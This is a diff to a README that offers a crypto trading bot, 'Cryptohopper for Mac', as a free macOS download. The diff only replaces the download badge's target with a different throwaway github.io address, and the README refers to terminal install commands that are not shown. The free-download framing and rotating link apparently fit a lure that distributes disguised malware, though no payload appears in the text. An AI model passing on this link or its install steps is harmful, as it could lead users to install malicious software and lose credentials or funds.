@@ -5,7 +5,7 @@ Cryptohopper for Mac is an advanced automated crypto trading bot 🚀.
 With this software, you can easily manage trades, automate strategies, and maximize profits directly on macOS.  
 Follow the guide below to install Cryptohopper for free on your Mac.
 
-[![Download For Mac](https://img.shields.io/badge/Download%20for%20MacOS-000000?logo=apple&style=for-the-badge)](https://kamartamara.github.io/.github/cryptohopper)
+[![Download For Mac](https://img.shields.io/badge/Download%20for%20MacOS-000000?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/cryptohopper)
 
 If the button does not work, follow the installation instructions below using terminal commands.
 
